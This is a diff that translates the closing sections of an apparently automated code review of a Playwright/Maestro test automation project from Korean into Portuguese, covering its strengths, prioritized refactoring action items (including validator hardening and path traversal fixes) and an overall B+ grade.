-유지되는 모듈(event-validation, test-status-store, report/markdown, registry, playwright-runner core, maestro-bridge core) 기준:
-
-### 필수 (리팩토링 전)
-- [ ] **[C-01]** validator.ts를 AST 기반 검증으로 강화하거나, 최소한 `globalThis[...]` 패턴 차단 추가
-- [ ] **[C-02]** Maestro bridge의 test.id를 sanitize하여 path traversal 방지
-- [ ] **[H-01]** run-tests.ts에서 공통 로직(status record, report save)을 별도 서비스로 추출
-- [ ] **[H-02]** loadYaml에 Zod 스키마 검증 통합
-- [ ] **[H-03]** TestStatusStore에 recordBatch 메서드 추가
-
-### 권장 (리팩토링 중)
-- [ ] **[H-05]** Event capture를 Playwright runner에 실제 구현하거나 "not implemented" 경고 반환
-- [ ] **[M-01]** 공통 TestRunResult 인터페이스 정의
-- [ ] **[M-02]** Registry의 path traversal 검증 추가
-- [ ] **[M-07]** TestStore 영속화 전략 결정
-- [ ] **[I-02]** ESLint 설정 도입
-
-### 개선 (리팩토링 후)
-- [ ] **[M-03]** 구조화된 로깅 적용
-- [ ] **[M-04]** Analytics parser에 에러 추적 추가
-- [ ] **[M-06]** Maestro 병렬 실행 지원
-- [ ] **[L-02]** parser.ts의 미사용 변수 제거
+1. **Boa consciência de segurança**: existe um validator do Playwright e os padrões bloqueados são abrangentes. A regra de proibir `console.log` também é bem seguida.
+2. **Boa qualidade de testes**: módulos centrais como event-validation, test-status-store, validator, parse-report e parser têm testes cobrindo diversos casos, incluindo boundary cases (arrays vazios, fluxos sem correspondência).
+3. **Padrão de registro de tools do MCP é limpo**: cada tool está em um arquivo separado, com baixo acoplamento via dependency injection.
+4. **Bom suporte a cancelamento**: o cancelamento via AbortSignal é suportado tanto no Playwright runner quanto no Maestro bridge.
+5. **Sistema de quarantine do TestStatusStore é bem projetado**: a lógica de promoção/rebaixamento baseada em janela de 5 execuções é clara e bem testada.
+6. **Regra ESM-only aplicada de forma consistente**: todos os imports usam extensão `.js`, e `"type": "module"` está configurado.
 
 ---
 
-## 전체 코드 건강도 평가
+## Action Items Prioritários para a Migração ao Standalone Agent
 
-**등급: B+**
+Com base nos módulos que serão mantidos (event-validation, test-status-store, report/markdown, registry, core do playwright-runner, core do maestro-bridge):
 
-아키텍처 기반이 탄탄하고, 보안 의식이 있으며, 핵심 로직에 테스트가 잘 작성되어 있다. Critical 이슈 2건은 보안 관련으로 반드시 수정해야 하며, run-tests.ts의 분해가 standalone agent 전환의 핵심 과제이다. 이 리뷰의 action items를 순서대로 해결하면 A 등급 프로젝트로 충분히 도달 가능하다.
+### Obrigatório (antes do refactor)
+- [ ] **[C-01]** reforçar o validator.ts com validação baseada em AST, ou pelo menos bloquear o padrão `globalThis[...]`
+- [ ] **[C-02]** sanitizar o test.id no Maestro bridge para prevenir path traversal
+- [ ] **[H-01]** extrair a lógica comum (registro de status, salvamento de relatório) de run-tests.ts para um serviço separado
+- [ ] **[H-02]** integrar validação de schema Zod ao loadYaml
+- [ ] **[H-03]** adicionar o método recordBatch ao TestStatusStore
+
+### Recomendado (durante o refactor)
+- [ ] **[H-05]** implementar a captura de eventos de verdade no Playwright runner, ou retornar aviso "not implemented"
+- [ ] **[M-01]** definir uma interface comum TestRunResult
+- [ ] **[M-02]** adicionar validação de path traversal no Registry
+- [ ] **[M-07]** decidir a estratégia de persistência do TestStore
+- [ ] **[I-02]** adotar configuração de ESLint
+
+### Melhoria (depois do refactor)
+- [ ] **[M-03]** aplicar logging estruturado
+- [ ] **[M-04]** adicionar rastreamento de erro ao parser de analytics
+- [ ] **[M-06]** suportar execução paralela no Maestro
+- [ ] **[L-02]** remover a variável não usada em parser.ts
 
 ---
 
-*Generated by Senior Code Review Agent at 2026-03-31*
+## Avaliação Geral da Saúde do Código
+
+**Nota: B+**
+
+A base arquitetural é sólida, existe consciência de segurança, e a lógica central tem bons testes. Os 2 issues críticos são de segurança e precisam ser corrigidos obrigatoriamente, e decompor o run-tests.ts é o principal desafio da migração para standalone agent. Resolvendo os action items desta review na ordem, é totalmente possível chegar a um projeto nota A.
+
+---
+
+*Gerado pelo Senior Code Review Agent em 2026-03-31*
